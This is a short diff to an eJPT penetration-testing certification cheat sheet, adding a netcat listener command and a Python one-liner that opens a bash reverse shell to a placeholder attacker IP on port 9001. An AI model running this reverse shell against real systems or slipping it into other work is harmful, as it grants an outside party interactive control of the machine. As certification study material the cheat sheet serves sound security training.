@@ -85,6 +85,13 @@ Info about eJPT certification [here](https://security.ine.com/certifications/ejp
 
 # eJPT Cheat Sheet
 
+
+ nc
+```shell
+nc -lvnp 9001
+import os; os.system("bash -c 'bash -i >& /dev/tcp/<my-ip>/9001 0>&1'")
+```
+ 
 crackstation
 ```url
 https://crackstation.net/
